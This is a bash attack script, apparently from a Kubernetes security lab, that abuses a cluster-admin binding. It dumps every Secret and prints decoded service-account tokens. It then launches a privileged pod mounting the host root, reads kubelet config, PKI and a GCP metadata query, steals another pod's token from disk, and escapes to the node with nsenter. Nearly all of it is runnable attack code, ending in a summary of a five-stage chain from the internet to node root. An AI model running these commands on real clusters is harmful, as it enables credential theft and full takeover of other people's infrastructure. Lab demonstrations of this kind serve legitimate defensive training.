#!/usr/bin/env bash
# ─────────────────────────────────────────────────────────────────────────────
# Attack 05 — Kubernetes cluster-admin Abuse & Node Escape
#
# MITRE ATT&CK : T1078.001 — Valid Accounts: Default Accounts
#                T1611     — Escape to Host
#                T1613     — Container and Resource Discovery
#                T1552.007 — Credentials in Container

set -euo pipefail

REPORT_DIR="$(dirname "$0")/../attack-output"
ESCAPE_DIR="$REPORT_DIR/05-cluster-escape"
mkdir -p "$ESCAPE_DIR"
ESCAPE_POD="wiz-escape-demo-$$"

banner() { echo; echo "  ┌─ $*"; }
step()   { echo "  │  $*"; }
done_()  { echo "  └─ done"; echo; }

cleanup() {
  echo ""
  echo "  [cleanup] Deleting escape pod $ESCAPE_POD..."
  kubectl delete pod "$ESCAPE_POD" --ignore-not-found --grace-period=0 2>/dev/null || true
}
trap cleanup EXIT

# ── 1. Confirm cluster-admin binding exists ───────────────────────────────────
banner "Phase 1: Confirming cluster-admin ClusterRoleBinding"

step "All cluster-admin bindings:"
kubectl get clusterrolebindings \
  -o json 2>/dev/null \
  | python3 -c "
import json, sys
data = json.load(sys.stdin)
for item in data['items']:
    if item['roleRef']['name'] == 'cluster-admin':
        name = item['metadata']['name']
        subjects = item.get('subjects', [])
        print(f'  Binding: {name}')
        for s in subjects:
            print(f'    Subject: {s.get(\"kind\")} / {s.get(\"name\")} (ns: {s.get(\"namespace\",\"cluster-wide\")})')
" | tee "$ESCAPE_DIR/cluster-admin-bindings.txt"

step "Checking what the current context can do:"
kubectl auth can-i '*' '*' --all-namespaces 2>/dev/null \
  && step "✓ Full cluster-admin confirmed — can perform ANY action on ANY resource" \
  || step "Limited permissions — checking specific dangerous permissions..."

kubectl auth can-i create pods --all-namespaces 2>/dev/null && step "  ✓ Can create pods in all namespaces"
kubectl auth can-i create clusterrolebindings 2>/dev/null   && step "  ✓ Can create ClusterRoleBindings"
kubectl auth can-i get secrets --all-namespaces 2>/dev/null && step "  ✓ Can read all Secrets in all namespaces"

done_

# ── 2. Enumerate all secrets in the cluster ───────────────────────────────────
banner "Phase 2: Reading all Secrets across all namespaces"

step "Listing all secrets..."
kubectl get secrets -A \
  --no-headers \
  -o custom-columns="NAMESPACE:.metadata.namespace,NAME:.metadata.name,TYPE:.type" \
  2>/dev/null | tee "$ESCAPE_DIR/all-secrets.txt"

step "Extracting service account tokens..."
kubectl get secrets -A -o json 2>/dev/null \
  | python3 -c "
import json, sys, base64
data = json.load(sys.stdin)
for item in data['items']:
    if item['type'] == 'kubernetes.io/service-account-token':
        ns = item['metadata']['namespace']
        name = item['metadata']['name']
        token_b64 = item.get('data', {}).get('token', '')
        if token_b64:
            token = base64.b64decode(token_b64).decode()[:80]
            print(f'  [{ns}] {name}: {token}...')
" 2>/dev/null | head -20 | tee "$ESCAPE_DIR/sa-tokens.txt"

done_

# ── 3. Create privileged escape pod ──────────────────────────────────────────
banner "Phase 3: Creating privileged pod with host filesystem mount"

step "Applying escape pod manifest..."

kubectl apply -f - <<EOF 2>/dev/null | tee "$ESCAPE_DIR/escape-pod-apply.txt"
apiVersion: v1
kind: Pod
metadata:
  name: ${ESCAPE_POD}
  namespace: default
  labels:
    app: escape-demo
    purpose: security-lab
spec:
  # Share the node's PID and network namespaces
  hostPID: true
  hostNetwork: true
  hostIPC: true
  restartPolicy: Never
  # Tolerate all taints to ensure scheduling
  tolerations:
  - operator: Exists
  containers:
  - name: escape
    image: alpine:latest
    command: ["sh", "-c", "sleep 600"]
    securityContext:
      privileged: true
      runAsUser: 0
      allowPrivilegeEscalation: true
    volumeMounts:
    - name: host-root
      mountPath: /host
      readOnly: false
    - name: host-proc
      mountPath: /host-proc
      readOnly: true
    resources:
      requests:
        cpu: "10m"
        memory: "32Mi"
  volumes:
  - name: host-root
    hostPath:
      path: /
      type: Directory
  - name: host-proc
    hostPath:
      path: /proc
      type: Directory
EOF

step "Waiting for pod to be running..."
kubectl wait pod "$ESCAPE_POD" \
  --for=condition=Ready \
  --timeout=60s \
  2>/dev/null

step "✓ Privileged escape pod is running: $ESCAPE_POD"
done_

# ── 4. Read node filesystem from inside the pod ───────────────────────────────
banner "Phase 4: Reading node filesystem — extracting sensitive files"

step "Node OS and kernel version:"
kubectl exec "$ESCAPE_POD" -- \
  sh -c 'cat /host/etc/os-release && uname -r' \
  2>/dev/null | tee "$ESCAPE_DIR/node-os.txt"

step "Kubelet configuration (contains cluster credentials):"
kubectl exec "$ESCAPE_POD" -- \
  sh -c 'cat /host/var/lib/kubelet/config.yaml 2>/dev/null || echo "not found"' \
  2>/dev/null | tee "$ESCAPE_DIR/kubelet-config.txt"

step "Kubernetes PKI certificates on node:"
kubectl exec "$ESCAPE_POD" -- \
  sh -c 'ls -la /host/etc/kubernetes/pki/ 2>/dev/null || ls -la /host/var/lib/kubelet/pki/ 2>/dev/null || echo "PKI path not found"' \
  2>/dev/null | tee "$ESCAPE_DIR/node-pki.txt"

step "Cloud metadata accessible from node network namespace:"
kubectl exec "$ESCAPE_POD" -- \
  sh -c 'wget -qO- --header="Metadata-Flavor: Google" \
    http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email \
    2>/dev/null || echo "metadata server not reachable from pod network"' \
  2>/dev/null | tee "$ESCAPE_DIR/node-metadata.txt"

done_

# ── 5. Read other pods' secrets from the node ─────────────────────────────────
banner "Phase 5: Reading secrets of other pods from the node filesystem"

step "Listing projected service account tokens on disk:"
kubectl exec "$ESCAPE_POD" -- \
  sh -c 'find /host/var/lib/kubelet/pods -name "token" -type f 2>/dev/null | head -10' \
  2>/dev/null | tee "$ESCAPE_DIR/pod-tokens-on-disk.txt"

step "Reading first token found (cross-pod credential theft):"
FIRST_TOKEN_PATH=$(kubectl exec "$ESCAPE_POD" -- \
  sh -c 'find /host/var/lib/kubelet/pods -name "token" -type f 2>/dev/null | head -1' \
  2>/dev/null)

if [[ -n "$FIRST_TOKEN_PATH" ]]; then
  kubectl exec "$ESCAPE_POD" -- \
    sh -c "cat $FIRST_TOKEN_PATH" \
    2>/dev/null | cut -c1-100 | tee "$ESCAPE_DIR/stolen-pod-token.txt"
  step "✓ Token stolen from another pod at: $FIRST_TOKEN_PATH"
fi

done_

# ── 6. Demonstrate nsenter host escape ────────────────────────────────────────
banner "Phase 6: Full host escape via nsenter (pid 1 namespace)"

step "Using hostPID to enter the node's init namespace..."
step "This gives us a shell running IN the node OS, not just the container:"

kubectl exec "$ESCAPE_POD" -- \
  sh -c '
    # nsenter into PID 1 namespace — we are now running on the node itself
    nsenter --target 1 --mount --uts --ipc --net --pid -- \
      sh -c "
        echo \"[+] Running on node: \$(hostname)\"
        echo \"[+] Node user: \$(whoami)\"
        echo \"[+] Node OS: \$(cat /etc/os-release | grep PRETTY_NAME)\"
        echo \"[+] Docker/containerd processes:\"
        ps aux | grep -E 'docker|containerd|kubelet' | grep -v grep | head -5
        echo \"[+] Network interfaces on node:\"
        ip addr show | grep -E 'inet |^[0-9]' | head -10
      "
  ' 2>/dev/null | tee "$ESCAPE_DIR/host-escape-output.txt"

done_

echo "  Attack 05 complete."
echo ""
echo "  ════════════════════════════════════════════════════"
echo "  FULL CHAIN SUMMARY: Internet → cluster-admin → node"
echo "  ════════════════════════════════════════════════════"
echo ""
echo "  Attack 01 → SSH port 22 open, regreSSHion vulnerable"
echo "  Attack 02 → MongoDB unauthenticated, full DB dump"
echo "  Attack 03 → GCS backup public, credentials extracted"
echo "  Attack 04 → Node SA is roles/editor, full GCP access"
echo "  Attack 05 → cluster-admin → privileged pod → node escape"
echo ""
echo "  An attacker starting from the public internet now has:"
echo "    - Full GCP project access (roles/editor via node SA)"
echo "    - Full Kubernetes cluster control"
echo "    - Root on the underlying GKE node"
echo "    - All application data and credentials"
echo ""
echo "  Findings saved to: $ESCAPE_DIR"
